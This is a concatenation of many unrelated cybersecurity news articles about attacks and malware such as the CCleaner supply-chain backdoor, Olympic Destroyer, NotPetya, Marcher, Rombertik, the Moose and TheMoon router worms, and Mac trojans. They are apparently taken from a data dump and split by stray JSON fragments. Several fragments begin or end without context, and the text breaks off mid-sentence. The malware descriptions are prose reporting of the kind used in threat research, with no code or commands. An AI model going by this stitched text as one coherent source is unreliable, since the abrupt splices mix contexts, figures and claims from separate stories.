The attack was disclosed on September 18, when security firm Avast revealed that 2.27 million users worldwide had downloaded an infected CCleaner installation file between August 15 and September 12. Hackers had added a backdoor to the 32-bit CCleaner v5.33.6162 and CCleaner Cloud v1.07.3191 releases, Avast revealed. What led to this was the compromise of the distribution servers of Piriform, the company developing CCleaner, in the months before Avast purchased the software firm. The code in the modified installers could collect non-sensitive information from the infected machines, and could also deliver a second stage binary. This revealed that the incident was in fact a highly targeted attack, as the second-stage payload was delivered to only 40 computers out of the millions that downloaded stage one. While no stage three binary was found on the affected systems, Avast now says that the attackers, the Chinese hacking group Axiom (also known as APT17 or DeputyDog), apparently had plans to deliver such malware as well. During its investigation of the Piriform infrastructure, the security firm discovered not only stage one and stage two binaries on the network, but also evidence of a third stage on four computers. Dubbed ShadowPad, this is a specialized tool that provides cybercriminals with remote control capabilities. In an August 2017 report, Kaspersky revealed that the ShadowPad backdoor was found in NetSarang’s products, which are used by hundreds of companies in the financial, software, media, energy, electronics, insurance, industrial, construction, manufacturing, retail, telecoms, pharmaceutical, and transportation sectors. “The tool was installed on the four Piriform computers on April 12th, 2017, while the preliminary version of the second stage had been installed on the computers March 12th, 2017,” Avast says. The command and control (C&C) server the older second stage variant was attempting to connect to was no longer up during the investigation and the researchers don’t know exactly what it was supposed to download. However, given the timeline of events, they assume that it “had downloaded and installed ShadowPad on the four Piriform computers.” The fact that ShadowPad is believed to have been developed by the Axiom group, the same actor behind the CCleaner attack, is also a strong indicator that this malware was intended to become the third stage payload, Avast says. The ShadowPad version used in the attack was custom-built, leading investigators to suspect it was explicitly created for Piriform. The security firm also discovered ShadowPad log files containing encrypted key strokes from a keylogger that became active on the infected machines on April 12, 2017. Other tools were also installed on the four computers, including a password stealer, along with tools that could install more software and plugins on the infected machines. “While ShadowPad was installed on the Piriform network itself and, as far as we can tell through our investigations today, not on any of the CCleaner customers’ computers, we believe that this tool was the intended third stage for the CCleaner customers,” Avast says. The second-stage malware deployed to only 40 computers of the millions that downloaded the infected CCleaner versions, but Avast couldn’t determine whether the third stage payload was meant for all of them or only a few, if any.

The Olympic Winter Games in Pyeongchang, South Korea, was hit by a cyberattack that caused temporary disruption to IT systems, including the official Olympics website, display monitors, and Wi-Fi connections. The attack involved Olympic Destroyer, a piece of malware designed to wipe files and make systems inoperable, and steal passwords from browsers and Windows. Compromised credentials are used to spread to other machines on the network. Kaspersky has also spotted infections at several ski resorts in South Korea. The malware, which leverages a leaked NSA exploit known as EternalRomance to spread via the SMB protocol, temporarily disrupted ski gates and lifts at the affected resorts. Several cybersecurity firms launched investigations into the Olympic Destroyer attack shortly after the news broke, and while they mostly agreed on the malware’s functionality, they could not agree on who was behind the operation. Some pointed the finger at North Korea, while others blamed China or Russia, leading some industry professionals to warn against this type of knee-jerk attribution. Kaspersky researchers also analyzed the Olympic Destroyer worm in an effort to determine who was behind the attack. While they have’t been able to identify the culprit, experts have found some interesting clues. The security firm has found a unique “fingerprint” associated with the notorious Lazarus Group, which has been linked to North Korea and blamed for high profile attacks such as the one on Sony, the WannaCry campaign, and various operations targeting financial organizations. This fingerprint was a 100% match to known Lazarus malware components and it did not appear in any other files from Kaspersky’s database. While this piece of evidence and the type of attack suggested that Olympic Destroyer could be the work of North Korea, other data gathered by researchers as a result of an on-site investigation at a South Korean target revealed inconsistencies. Experts determined that the unique fingerprint was likely a sophisticated false flag planted by the attackers to throw investigators off track. “To our knowledge, the evidence we were able to find was not previously used for attribution. Yet the attackers decided to use it, predicting that someone would find it. They counted on the fact that forgery of this artifact is very hard to prove,” explained Vitaly Kamluk, head of the APAC research team at Kaspersky. “It’s as if a criminal had stolen someone else’s DNA and left it at a crime scene instead of their own. We discovered and proved that the DNA found on the crime scene was dropped there on purpose. All this demonstrates how much effort attackers are willing to spend in order to stay unidentified for as long as possible. We’ve always said that attribution in cyberspace is very hard as lots of things can be faked, and Olympic Destroyer is a pretty precise illustration of this.” In addition to this apparent link to North Korea, Kaspersky has found evidence that would suggest the involvement of the notorious group known as Sofacy, Fancy Bear, APT28 and Pawn Storm, which is widely believed to be sponsored by the Russian government. One possible scenario is that the Russian hackers attempted to frame Lazarus for the attack after the North Korean group tried to pin one of its campaigns on Russian actors. It’s also possible that the false flag used in the Olympics attack is part of the hackers’ efforts to improve their deception techniques. Links to China have been found by Intezer, which specializes in recognizing code reuse. Its analysis led to the discovery of numerous code fragments uniquely linked to threat groups tracked as APT3, APT10 and APT12. " }

APT28 is also tracked as Fancy Bear, Pawn Storm, Sofacy, Tsar Team, Strontium and Sednit. The threat actor has been linked to several high-profile attacks aimed at government and other types of organizations around the world, including the recent election-related hacker attacks in the United States. APT28 has been known for using an OS X downloader named Komplex, and researchers from Bitdefender and Palo Alto Networks have now come across another Mac malware believed to be part of the group’s arsenal. XAgent, or X-Agent, is a Trojan used by APT28 in attacks targeting Windows systems. A recently analyzed campaign aimed at Ukraine indicates that the group may have also developed an Android version of XAgent. Bitdefender and Palo Alto Networks have also identified a macOS version of XAgent, which they believe is downloaded to targeted systems by the Komplex downloader. Both security firms determined, based on binary strings, that Komplex and XAgent were likely created by the same developer. Once it infects a Mac computer, the malware, which its authors call XAgentOSX, contacts a command and control (C&C) server and waits for instructions. C&C communications are similar to the ones used by the Windows version of XAgent. XAgentOSX can collect information about the system, running processes and installed applications, it can download and upload files, execute commands and files, and take screenshots. The malware also looks for backup files from an iPhone or iPad, which it can exfiltrate using one of the available commands. XAgentOSX can also log keystrokes, allowing the attackers to obtain the victim’s credentials. Bitdefender told SecurityWeek that it does not have any information on XAgentOSX infections and targets, but the company believes the victims are hand-picked in an effort to prevent the exposure of malware samples. “Most likely, this sample is directed at the same audience that makes the focus of the APT28 group (government, airspace, telecom and, e-crime services). It most likely covers the instances in which targets in the respective groups use Macs as work or personal computers,” said Bogdan Botezatu, Senior E-Threat Analyst at Bitdefender. APT28 is a sophisticated threat group whose arsenal includes a wide range of tools, including Linux malware. One of the actor’s favorite Linux tools is Fysbis, an unsophisticated yet efficient backdoor. " }

Locker demands the payment of 0.1 Bitcoin for the decryption key. If the ransom is not paid within 72 hours, the amount increases to 1 Bitcoin. The threat has been distributed with the aid of a Trojan downloader, which received a command instructing it to install Locker on infected systems on May 25.

Josh Pitts, a researcher with the Leviathan Security Group, has been analyzing ways to alter binary files during download with the aid of man-in-the-middle (MitM) attacks. In a presentation he made at the DerbyCon security conference this year, the expert noted that cybercriminals had probably been using techniques similar to the one he disclosed, but he only had circumstantial evidence. To put his theory to the test, Pitts developed a module for Exitmap, a Python-based tool that allows users to check Tor exit nodes for traffic modifications. Roughly an hour after he started running the tool, the researcher identified a \"very active\" Russian exit node that was wrapping binary files that passed through it with malware.  By wrapping the legitimate file with their malicious binary, the attackers can bypass mechanisms designed to check the file's integrity.  \"Out of over 1110 exit nodes on the Tor network, this is the only node that I found patching binaries, although this node attempts to patch just about all the binaries that I tested,\" Pitts said in a blog post.  \"The node only patched uncompressed PE files. This does not mean that other nodes on the Tor network are not patching binaries; I may not have caught them, or they may be waiting to patch only a small set of binaries.\" The Russia-based exit node was reported to the Tor Project. \"Companies and developers need to make the conscious decision to host binaries via SSL/TLS, whether or not the binaries are signed. All people, but especially those in countries hostile to 'Internet freedom,' as well as those using Tor anywhere, should be wary of downloading binaries hosted in the clear—and all users should have a way of checking hashes and signatures out of band prior to executing the binary,\" Pitts said. Tor Project Leader Roger Dingledine says they have set the \"BadExit\" flag on the offending relay to protect users.  \"We certainly do need more people thinking about more modules for the exitmap scanner. In general, it seems like a tough arms race to play and as you say, the better approach is to have applications not blindly trust unauthenticated bits they get from the Internet,\" Dingledine wrote in a comment addressed to Pitts.  Circumstantial evidence of attacks  Before finding solid proof that someone is actually \"patching\" files, Pitts analyzed error messages that can appear in such cases.  Some software developers sign their files to make sure they cannot be tampered with. In the case of Windows, for instance, if someone tries to modify Windows Update PE files, the update process triggers an error and the components are not installed because of a verification mechanism implemented by Microsoft. According to the expert, the same error is shown if the file is truncated during download, the most plausible scenario, and if the Microsoft certificate verification process is broken, an unlikely case. The thread on this topic on the official Microsoft Answers website has been viewed over 34,000 times, which indicates that this is a common problem. Those who encounter this issue are in some cases advised by Microsoft to download patches, or so-called \"FixIt\" solutions, that should address the problem. Pitts believes this could be leveraged by someone who is adding malware to files as they are downloaded by users. For example, the attacker first alters the Windows Update files. These files are not executed because of the integrity verification mechanism from Microsoft. However, the error will make users visit the Microsoft Answers website where they are advised to download the patches.  If the attacker can attach malware to these patches, he doesn't have to worry about the malicious file being flagged because it's downloaded and executed by the user; it doesn't go through the update process which verifies the files. Furthermore, the malicious payload is executed with administrator privileges because that is how official patches from Microsoft are executed.  Another piece of evidence that has led to the researcher to believe someone could be altering files by using methods similar to the one he described is related to NSIS (Nullsoft Scriptable Install System), a professional open source system designed for creating Windows installers. NSIS includes a self-checking mechanism to ensure that files compiled with it are not altered. By analyzing the error code that's displayed in case a corrupt file is detected, Pitts noticed that a lot of users searched for it on Google. While in most cases the error was likely triggered due to the binary being truncated during download due to a poor Internet connection, there's also the possibility that some of the files were actually maliciously altered by cybercriminals, the expert said.   " }

Marcher has been around since late 2013, but it initially attempted to trick users into handing over their payment card details using Google Play phishing pages. In March 2014, the malware started targeting banks in Germany and, by the summer of 2016, there had already been more than 60 targeted organizations in the U.S., U.K., Australia, France, Poland, Turkey, Spain and other countries. The malware has been disguised as various popular apps, including Netflix, WhatsApp and Super Mario Run. Securify has identified nine Marcher botnets over the last 6 months, and each of them has been provided with new modules and targeted web injects by the Trojan’s creators. One of these botnets, which mainly targets the customers of banks in Germany, Austria and France, has infected more than 11,000 devices, including 5.700 in Germany and 2,200 in France. The attackers’ C&C server stored 1,300 payment card numbers and other banking information. Based on the analysis of the command and control (C&C) server used by the cybercriminals, researchers determined that a majority of the infected devices had been running Android 6.0.1, but the list of victims also included more than 100 Android 7.0 devices.  Marcher monitors the applications launched by the victim, and when one of the targeted apps is detected, an overlay screen is displayed in an effort to trick the user into handing over sensitive information. “Marcher is one of the few Android banking Trojans to use the AndroidProcesses library, which enables the application to obtain the name of the Android package that is currently running in the foreground. This library is used because it uses the only (publicly known) way to retrieve this information on Android 6 (using the process OOM score read from the /proc directory),” Securify researchers explained. In order to avoid being removed by security products, Marcher blocks popular mobile antivirus applications. Seven months ago, researchers said the Trojan had been blocking eight antiviruses, but Securify’s report shows that the malware currently targets nearly two dozen products. “Based on the statistics we found on this one C2 panel we researched and the amount of different C2 panels out there, we believe that the potential financial losses due to Android banking Trojans are, or will soon be, bigger than the current losses from desktop malware like Gozi and Dridex, especially since hardly any of the banking apps seem to detect the attack,” experts said.

By pairing “sophisticated math and machine learning with an understanding of a hacker’s mentality,” Cylance says it can protect customers against new malware, bots and unknown future variants.  “The fundamental flaw in today’s cybersecurity infrastructure is that detection happens before prevention,” said Stuart McClure, Cylance founder and CEO. “Human-generated signatures, based primarily on previously discovered samples, have failed to solve the problem as zero-day malware continues to operate silently and unimpeded.”  While the company does say that traditional security solutions are not effective enough, CylancePROTECT is designed to complement existing endpoint security products.  “Its value is to eliminate the concern for unknown and advanced threats, often missed by the other solutions,” the company explained.   CylancePROTECT’s “agent” sits on top of current security solutions and integrates with existing management software such as like McAfee ePO, the company said. Additionally, the product incorporates memory protection and execution control through kernel modules to address advanced non-resident-based threat tactics, including injection and hijacking techniques, overflows and in-memory execution techniques.   More information on CylancePROTECT is available online.  " }

While Merck has not provided details about the incident in its financial report, the June 27 attack referenced by the company is most likely the NotPetya malware outbreak that affected tens of thousands of systems in more than 65 countries. Many of the victims were located in Ukraine, the home of a tax software firm whose product was used as the main attack vector. Researchers initially believed NotPetya (aka PetrWrap, exPetr, GoldenEye and Diskcoder.C) was a piece of ransomware, similar to WannaCry. However, a closer analysis revealed that it was actually a wiper and it was unlikely that victims could recover their files, even if they paid the ransom. Merck, which was named as one of the victims of the NotPetya attack shortly after the outbreak started, said on Friday that it had yet to fully assess the impact of the disruption. The company said it had still been working on restoring operations and minimizing the effects of the incident. “The company is in the process of restoring its manufacturing operations. To date, Merck has largely restored its packaging operations and has partially restored its formulation operations,” Merck said. “The company is in the process of restoring its Active Pharmaceutical Ingredient operations but is not yet producing bulk product. The company’s external manufacturing was not impacted. Throughout this time, Merck has continued to fulfill orders and ship product.” Merck is just one of several major companies affected by the NotPetya attack. The list also includes Ukraine's central bank, Russian oil giant Rosneft, UK-based advertising group WPP, Danish shipping giant A.P. Moller-Maersk, and FedEx-owned TNT Express. FedEx reported last month that it had still been working on restoring systems hit by the destructive malware attack, and admitted that it may not be able to fully restore all affected systems and recover all the critical business data encrypted by NotPetya. Reckitt Benckiser, the British consumer goods company that makes Nurofen, Dettol and Durex products, said the attack disrupted its ability to manufacture and distribute products. The firm estimated that the incident could have an impact of £100 million ($130 million) on its revenue. " }

Researchers at ThreatConnect have conducted an analysis and traced the destructive sample to a Nigeria-based individual. Rombertik’s destructive capabilities were brought to light by Cisco. The firm’s Talos Security Intelligence and Research Group informed last month that the malware has several anti-analysis features, including one that’s designed to overwrite the MBR and encrypt files in case an “anti-analysis check” fails. Researchers at Symantec also analyzed the sample in question and noted that the malware is actually a version of Carbon Grabber, which the company detects as Infostealer.Retgate. Symantec said the feature designed to overwrite the MBR and encrypt files is actually an anti-piracy mechanism created by the malware’s authors to prevent unauthorized use. Symantec explained that when someone purchases Rombertik from its creator, they get a copy that communicates only with their command and control (C&C) server, the address of the C&C being embedded in the binary code. If someone obtains a Rombertik sample and wants to adapt it for their own operation by cracking the binary and changing the address of the C&C, the destructive protection mechanism is triggered. Several security firms analyzed Rombertik, but they haven’t published any details on the source of the destructive sample. Based on C&C information from Cisco’s report, ThreatConnect researchers have managed to trace the sample to a Nigerian man whom they believe caused the destructive mechanism to be triggered. The starting point of ThreatConnect’s analysis is centozos[.]org[.]in, the C&C domain to which the Rombertik sample attempted to send data stolen from infected computers. This domain was registered using the email address [email protected][.]com. Dispostable is a disposable email service that allows users to send and receive emails without needing a password to access their account. Anyone can access an account on this service as long as they know the username. Researchers accessed [email protected][.]com and uncovered [email protected][.]com, an email address CCd in one of the received emails. This particular Yahoo address led investigators to the online moniker “KallySky” (KallyKay), believed to be used by Kayode Ogundokun, a 30-year-old man from Lagos, Nigeria. Ogundokun, who has accounts on several social media websites, offers tutorials and services related to various pieces of malware, including Zeus, DarkComet RAT, CyberGate RAT, and Carbon Grabber. “It appears that Ogundokun is primarily focused in exploiting individuals for financial gain versus any other observed motive,” ThreatConnect explained in a blog post. “Many of Ogundokun internet posts appear to be run of the mill scams, where previous victims have been able to identify him as seen posted to one of his Facebook pages.” The suspect hasn’t done much to attempt to hide his tracks and his skillset appears to be limited to using off-the-shelf malware for financial gain. His lack of skills is likely what led to the Rombertik destructive feature getting triggered. “The [ThreatConnect Intelligence Research Team] assesses that Ogundokun likely purchased a new version of Carbon Grabber from a much more capable and sophisticated tool author, where the author subsequently sold or licensed it to the less capable operator,” the security firm noted. “This particular sample was keyed to the centozos.org[.]in infrastructure that Ogundokun maintained, where it was later operationalized and was identified by Cisco. It appears as if this particular sample of Carbon Grabber was simply caught up in a headline grabbing story.” ThreatConnect has noted that despite Ogundokun’s rudimentary skillset and poor Operations Security (OPSEC), he has managed to conduct some successful operations. For example, within a 3-week period, he infected nearly 900 hosts located all around the world with Zeus malware. The problem, according to ThreatConnect, is that adversary intelligence or attribution is often neglected because it’s considered too difficult or too controversial. “As news of Rombertik spread, we saw sensationalized reporting which used attention grabbing terms such as ‘terrifying’ ‘deadly’ ‘suicide bomber malware’ dominate the security news headlines. Now if we consider for a moment the lost man hours due to ad hoc reprioritization for many security teams globally who were queried or tasked by their leadership to determine if their organization was at risk to Rombertik,” ThreatConnect said. “Had the organizations also had Adversary Intelligence of Ogundokun’s rudimentary technical and operational sophistication, they would have seen a clearer comparison of the functional capabilities of the Rombertik/Carbon Grabber contrasted against Ogundokun intent, and could have effectively determined an appropriate level of risk mitigation,” the company added.

Rather than forage for food in a forest like its namesake, the malware looks primarily for Linux-based consumer routers. In particular, it affects Linux-based embedded devices running on the MIPS and ARM architectures. According to ESET, Moose can eavesdrop on communications to and from devices connected behind the infected router, and runs a comprehensive proxy service (SOCKS and HTTP) that can be accessed by a specific list of IP addresses. It can also be configured to reroute router DNS traffic to enable man-in-the-middle attacks. \"The compromised devices are used to steal unencrypted network traffic and offer proxying services to the botnet operator,\" according to a whitepaper from ESET. \"In practice, these capabilities are used to steal HTTP Cookies on popular social network sites and perform fraudulent actions such as non-legitimate \"follows\", \"views\" and \"likes\" on such sites.\" Among the social networking sites focused on by the worm are Twitter, Facebook, Instagram and YouTube. \"The sad truth is that there are many individuals and companies out there who are keen to manipulate their social media standing, and have no qualms about hiring third-parties who claim to have methods to bump up the number of views of a corporate video, boost the followers on a Twitter feed or get you more Facebook fans,\" blogged security expert Graham Cluley. \"Often these third-parties will themselves contract the work out to other companies, and the danger is that one of these might – perhaps unwittingly – hire criminals with access to the botnet of Moose-compromised routers to conduct the social media fraud on their behalf.\" That these views or followers aren't actually legitimate may go unnoticed or be swept under the rug by marketing teams looking to impress their bosses, he added. Attempting to commit fraud on these sites requires a reputable and disposable IP address, the paper notes. \"If someone tries to register 2000 twitter accounts from his own IP address this will likely draw attention,\" according to the report. \"To a social network site operator, there is probably nothing more reputable than an IP address behind a well-known ISP. Just the type of network where you can expect to find badly configured consumer routers.\" According to ESET, Actiontec, Hik Vision, Netgear, Synology, TP-Link, ZyXEL, and Zhone devices are impacted by the worm, though it is not clear that all are being targeted. Olivier Bilodeau, malware researcher at ESET and co-author of the whitepaper on Moose, said that the infected devices look for other routers exposing their Telnet management interface by both scanning randomly and using a pattern to find systems whose IP addresses are closely-related to the IP address of the infected device. \"Combining these two techniques maximizes the chances of the router of finding new potential victims,\" he said. \"Once a device with a responding Telnet service is found, the malware attempts to bruteforce the username and password using a list of well-known default credentials that it received as part of its configuration. Once it [finds] a good username and password combination, the malware will fetch commands from a command and control server that will complete the infection by downloading an executable tailored to the infected platform and executing it.\" ESET recommends router owners change the default passwords on network equipment even if it is not reachable from the Internet. In addition, disable the Telnet login and use SSH where possible. Router owners should also make sure their device is not accessible from the Internet on ports 22 (SSH), 23 (Telnet), 80 (HTTP) and 443 (HTTPS). If a device is infected, ESET recommends a firmware update or reinstall as well as a password change. " }

Malicious actors are increasingly using malware that works directly from memory and legitimate software – both open and closed source – to make detection and incident response more difficult for defenders. While analyzing an attack aimed at a bank, Kaspersky experts discovered that the attackers had used several legitimate applications, without any actual malware, to achieve their goal. The security firm later identified more than 140 similar attacks aimed at banks, telecom companies and government organizations in the United States, the United Kingdom, France, Ecuador, Kenya, Brazil, Spain, Israel and 32 other countries.  The cybercriminals leveraged an exploit for a known vulnerability to breach the servers of the targeted organizations. Once they gained access, they used the Mimikatz exploitation tool to obtain credentials that would provide them the elevated privileges needed to execute the other tools. They then used PowerShell scripts, components of the Metasploit framework (e.g. Msfvenom and Meterpreter), and the standard Windows tool Sc to deploy malicious code in memory. Another standard Windows utility, Netsh, allowed the hackers to set up a proxy tunnel that could be used to communicate with the command and control (C&C) server and remotely control the infected host. Since the malicious code is stored only in memory and the Windows registry, nearly all traces of the attack disappear after a reboot of the device, making detection and forensic analysis difficult. The tactics, techniques and procedures are similar to the ones of the cybercrime groups known as Carbanak and GCMAN, but the lack of evidence left behind by the attackers makes attribution difficult and researchers could not confirm that all the attacks were launched by the same actor. “Techniques like those described in this report are becoming more common, especially against relevant targets in the banking industry. Unfortunately the use of common tools combined with different tricks makes detection very hard,” explained Kaspersky researchers. “After successful disinfection and cleaning, it is necessary to change all passwords. This attack shows how no malware samples are needed for successful exfiltration of a network and how standard and open source utilities make attribution almost impossible,” they added. " }

The cyber espionage group, which experts believe is sponsored by a nation state, has been active for several years, but it managed to stay under the radar until last year, when researchers analyzed two of its main tools, namely SYSCON and KONNI. These pieces of malware had been leveraged in attacks aimed at organizations linked to North Korea. McAfee’s Advanced Threat Research team recently spotted a new campaign that appears to focus on North Korea, particularly humanitarian aid efforts. The security firm named this operation Honeybee based on the name of the user who created the malicious documents. Previous research into this group’s activities and a new McAfee report claim the threat actor is likely a Korean speaker. In the past, some even suggested that the attacks may have been launched from South Korea. However, McAfee told SecurityWeek that South Korea is most likely not behind the attacks. The security firm believes this is the work of an actor interested in inter-Korean affairs, specifically in English-language information. The attack starts with a spear-phishing email carrying or linking to a malicious document. The document contains a macro designed to drop and execute a new version of the SYSCON backdoor. The malware allows attackers to upload files to a server, and download files to the compromised system and execute them. The campaign appears to be mainly focused on North Korea, particularly humanitarian aid efforts, with primary targets located in Southeast Asia and the Americas. While many of the targeted entities are located in South Korea, some attacks are also aimed at users in Vietnam, Singapore, Japan, Indonesia, Canada and Argentina. Some of the malicious documents used to deliver the malware reference North Korea – for example, one is named “International Federation of Red Cross and Red Crescent Societies – DPRK Country Office.” Other documents, however, rely on a different approach. They display fake Google Docs or Microsoft Office messages that instruct recipients to enable editing and content in order to access the information. If users comply, malicious code is executed and malware is downloaded to their device.  Some of the droppers used in the Honeybee campaign are only disguised as documents. One dropper, tracked by McAfee as MaoCheng, has a document icon, but it’s actually an executable file signed with a stolen Adobe certificate. Once executed, MaoCheng opens a decoy document that instructs users to enable content in order to access the information. McAfee said the MaoCheng dropper was likely created specifically for the Honeybee campaign and it has only been spotted two times. A new variant of the SYSCON backdoor was first seen by researchers on January 17, but the operation has relied on new implants since at least November 2017. Experts say many components are loosely based on previous versions of SYSCON, but they are unique from a code perspective. “The attacks used simplistic malware, but the speed to put the campaign into production indicates that this is a well-organized group, hence it has the traits of a nation state level group,” Ryan Sherstobitoff, McAfee Senior Analyst of Major Campaigns, told SecurityWeek.

A self-replicating worm known as Moon was reported last week. Known as 'TheMoon', the worm is just spreading at the moment. Details of the vulnerability exploited by the worm have been leaked on Reddit along with four vulnerable CGI scripts.  \"We do not have a definite list of routers that are vulnerable, but the following routers may be vulnerable depending on firmware version: E4200, E3200, E3000, 32500, E2100L, E2000, E1550, E1500, E1200, E1000 and E900,\" blogged Johannes B. Ullrich, chief technology officer at SANS Institute. Other routers that may also be vulnerable include: WAG320N, WAP300N, WAP610N, WES610N, WET610N, WRT610N, WRT600N, WRT400N, WRT320N, WRT160N and WRT150N. \"The worm will connect first to port 8080, and if necessary using SSL, to request the \"/HNAP1/\" URL,\" he explained. \"This will return an XML formatted list of router features and firmware versions. The worm appears to extract the router hardware version and the firmware revision.\" The next step is for the worm to send an exploit to a vulnerable CGI script running on these routers. The request does not require authentication, and the worm sends random \"admin\" credentials that are not checked by the script. \"This second request will launch a simple shell script, that will request the actual worm,\" Ullrich noted. \"The worm is about 2MB in size, samples that we captured so far appear pretty much identical but for a random trailer at the end of the binary. The file is an ELF MIPS binary.\" \"Once this code runs, the infected router appears to scan for other victims. The worm includes a list of about 670 different networks (some /21, some /24). All appear to be linked to cable or DSL modem ISPs in various countries. An infected router will also serve the binary at a random low port for new victims to download. This http server is only opened for a short period of time, and for each target, a new server with a different port is opened.\" Users should be on the lookout for heavy outbound scanning on ports 80 and 8080 as well as inbound connection attempts to miscenalous ports below 1024. The worm appears to include strings that point to a command and control channel, and includes basic HTML pages with images that include images based on the movie 'The Moon.' In an interview with SecurityWeek, Ullrich added that so far, not much else is known about the command and control behind the malware. SANS Institute does not have a \"good estimate\" of how many routers have been infected by the worm, but Ullrich estimates that it is less than 1,000.  \"To protect themselves, users should disable the remote admin capability it is disabled by default,\" he said. \"Users should also update to the latest firmware version and regularly check for updates.\" " }

The tools, said to be part of a CIA project named “Imperial,” are called Achilles, Aeris and SeaPea. A “secret” document dated July 2011 reveals that Achilles is a tool that can be used to create trojanized OS X disk image installers (.dmg). The resulting DMG file will contain a legitimate application and malicious executables added by the user – these files will be executed only once after the real application has been launched. SeaPea is an OS X rootkit designed to provide stealth and launching capabilities for other tools. Version 2.0 of SeaPea was detailed in documents previously dumped by WikiLeaks, but the new user guide provides information on version 4.0. Finally, Aeris is an implant designed to target operating systems that are compliant with the Portable Operating System Interface for Unix (POSIX), including Debian, Red Hat, Solaris, FreeBSD and CentOS. POSIX is a set of specifications for maintaining compatibility between Unix-like operating systems by defining the API for software compatibility. Apple’s operating systems are also POSIX-compliant. The Aeris tool includes various features, including for automatically exfiltrating files and encrypted communications. As with many of the other Vault 7 tools exposed by WikiLeaks, given that their user guides were written several years ago, it’s likely that these projects have either been improved considerably to keep up with the new security features introduced by the creator of the targeted software or they were abandoned altogether. Other tools described in documents published by WikILeaks over the past few months are designed for intercepting SMS messages on Android devices (HighRise), redirecting traffic on Linux systems (OutlawCountry), stealing SSH credentials (BothanSpy), spreading malware on an organization’s network (Pandemic), locating people via their device’s Wi-Fi (Elsa), hacking routers and access points (Cherry Blossom), and accessing air-gapped networks (Brutal Kangaroo).

According to new research from Distil Networks, 2014 was the first year that bots masking themselves as mobile web users began arriving in droves and a mobile carrier [T-Mobile USA] appeared on the list of the top 20 Internet Service Providers serving bad bot traffic. Overall, bad bots were responsible for more than eight percent of mobile web traffic, according to the report. \"Bots tend to follow the trends in real usage by a lag of six to twelve months,\" said Rami Essaid, CEO and co-founder of Distil Networks. \"For example, when Chrome started overtaking other web browsers, we saw the bots follow that trend...reporting themselves as Chrome. Now we're seeing the same thing with mobile. We're seeing bots running on mobile networks, as malware on end user devices, as well as farms of cheap mobile android devices. Also, mobile sites tend to be easier to scrape because they provide the bots with more structured access to data.\" While good bots such as search engine crawlers can benefit a site, bad bots are key culprits behind everything from unauthorized vulnerability scans to brute force attacks, according to Essaid. \"A bot is a tool; a mechanism by which to automate an action,\" Essaid told SecurityWeek. \"Hackers use it to break into accounts. Competitors use it for competitive data mining. The minimum threshold for a bad bot would be one that provides no value to the host. Kind of like a parasite. If you don't provide value back to the site then it's a bad bot. For example, if you had a retail store and people were secret shopping you, doing competitive intelligence, with no intent of buy anything, then you have a right to ask them to leave. \" The dataset in the report covers the 23 billion bad bot threats the company observed in 2014 as well as good bot and human traffic. The dataset resides in Distil’s Hadoop Cluster and includes data from hundreds of customers as well as Distil’s global network of 17 data centers, according to the company.

That percentage is actually a drop from 2013, when 24.22 percent of all web traffic could be traced to bad bots. In 2014, 41 percent of bad bots attempted to enter a website's infrastructure disguised as legitimate human traffic. Twenty-three percent of them were categorized as 'highly sophisticated' and were immune to bot detection methods found in many Web application firewalls. Seven percent of bad bots disguised themselves as good bots such as Googlebot and Bingbot. \"Webmasters allow entry of the Googlebot to their website infrastructure for SEO purposes,\" according to the report. \"When a bad bot masked as the Googlebot enters a site, it can cause a wide range [of] problems without raising any alarms.\" The research can be read here.

The malware was analyzed by Claudio Guarnieri and Collin Anderson, researchers specializing in Iranian surveillance and espionage campaigns targeting human rights, foreign policy and civil society entities. MacDownloader, disguised by attackers as a Flash Player update and a Bitdefender adware removal tool, was created towards the end of 2016. Much of the code has been copied from other sources and experts believe this could be an amateur developer’s first attempt at creating a piece of malware. When Guarnieri and Anderson conducted their analysis, the malware had not been known to any of the security products on VirusTotal. At the time of writing, nearly a dozen vendors have flagged the fake Flash Player and Bitdefender apps as malicious. MacDownloader was first spotted on a fake website of aerospace firm United Technologies Corporation, which had previously delivered Windows malware. The same host had also been used to deploy the Browser Exploitation Framework (BeEF) on sites apparently belonging to the U.S. Air Force and a dental office. While the attacks observed by Guarnieri and Anderson appear to be targeted at the defense industrial base sector, the experts are aware of reports that it has also been used against a human rights advocate. Evidence suggests that the macOS malware is tied to Charming Kitten, aka Newscaster and NewsBeef, an Iranian threat actor known for creating fake personas on social networking websites in an effort to harvest information from targeted individuals in the US, Israel, the UK, Saudi Arabia and Iraq. Charming Kitten is also known for using BeEF. Once it infects a device, the malware harvests information about the system, including processes and applications, and collects passwords stored in the Keychain. The Windows malware used by the group is similar, collecting saved credentials and browser history from Chrome and Firefox. While its code shows that the developers of MacDownloader have attempted to implement remote update and persistence capabilities, these mechanisms don’t appear to be functional. Researchers have found links between MacDownloader and other threat actors believed to be located in Iran, including the Iran Cyber Security Group, which specializes in defacing websites, and Flying Kitten (aka Rocket Kitten), which is known for targeting organizations in the Middle East and NATO countries.

The malware, dubbed OSX/CoinThief.A, was discovered by Secure Mac, and works by sniffing web traffic for login information for popular bitcoin sites.  \"The malware, which comes disguised as an app to send and receive payments on Bitcoin Stealth Addresses, instead covertly monitors all web browsing traffic in order to steal login credentials for Bitcoin wallets,\" according to the Secure Mac blog. The Trojan can add itself to the growing list of malware targeting bitcoin users. Last month, researchers at LogRhythm uncovered a campaign that spammed out emails with links leading to bitcoin-stealing malware that infected thousands of users. In addition, the malvertising attack that hit Yahoo users in Europe sought to turn infected computers into bitcoin-mining machines. In this case, the attack started with an app called 'StealthBit.' A precompiled version of the app was posted on GitHub along with its source code. The precompiled version did not match a copy generated from the source code; instead, it contained a malicious payload that infected anyone who downloaded and ran the precompiled version.  Disguised as an app designed to send and receive payments on Bitcoin Stealth Addresses, the Trojan actually acts as a dropper and installs browser extensions that monitor all web traffic on the lookout for login credentials for sites such as BTC-e and Mt. Gox. \"The precompiled version of StealthBit did not match a copy generated from the source code, as it contained a malicious payload. Users who downloaded and ran the precompiled version of StealthBit instead ended up with infected systems,\" according to Secure Mac. \"A user posting over the weekend on Reddit, the popular discussion site, reported losing 20 Bitcoins (currently worth upwards of $12,000 USD) to the thieves.\" \"When login credentials are identified, such as when a user logs in to check their Bitcoin wallet balance, another component of the malware then sends the information back to a remote server run by the malware authors,\" Secure Mac continued. The first time the user runs the program, the malware installs browser extensions for Safari and Google Chrome without alerting the user. The malware installs a program that continually runs in the background looking for the login information. \"OSX/CoinThief.A can both send information to as well as receive commands from a remote server, including a functionality to update itself to newer versions from the malware author,\" according to the blog. \"Information sent back to the server isn't limited to Bitcoin login credentials, but also includes the username and UUID (unique identifier) for the infected Mac, as well as the presence of a variety of Bitcoin-related apps on the 